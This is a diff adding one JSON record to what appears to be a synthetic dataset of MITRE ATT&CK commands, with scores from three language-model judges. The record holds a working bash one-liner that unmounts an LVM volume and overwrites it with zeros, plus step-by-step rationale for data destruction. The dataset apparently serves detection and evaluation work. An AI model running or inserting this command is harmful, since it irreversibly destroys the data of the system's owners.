@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'lv=/dev/vg_finance/lv_archive; umount \"$lv\" 2>/dev/null || true; dd if=/dev/zero of=\"$lv\" bs=4M oflag=direct status=progress'",
+  "explanation": "Targets a specific LVM logical volume and overwrites it with zeros, destroying all contained data.",
+  "rationale_steps": [
+    "Select the dedicated logical volume",
+    "Unmount to avoid active filesystem writes",
+    "Overwrite the entire volume with zeros",
+    "Bypass cache to ensure on-disk destruction"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-b05d0366",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags for dd, and correct error redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1485 (Data Destruction) by unmounting a logical volume and then using dd to overwrite it with zeros, making data recovery impossible.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T02:02:26.827522Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed bash -c string with balanced quotes, proper separators, and valid dd and umount options.",
+        "semantic_score": 3,
+        "semantic_justification": "It correctly targets an LVM LV and overwrites it with zeros for data destruction, but without elevated privileges the unmount and block device write will fail, making the action unlikely to succeed as stated.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:02:44.298984Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using standard shell constructs, balanced quotes, and valid flags for all commands, ensuring parseability and correct execution flow.",
+        "semantic_score": 1,
+        "semantic_justification": "The command requires root privileges to `umount` and write with `dd` to a raw block device like `/dev/vg_finance/lv_archive`, directly contradicting the stated 'Privilege: None', making its claimed data destruction intent impossible to achieve in the specified context.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:02:56.791184Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
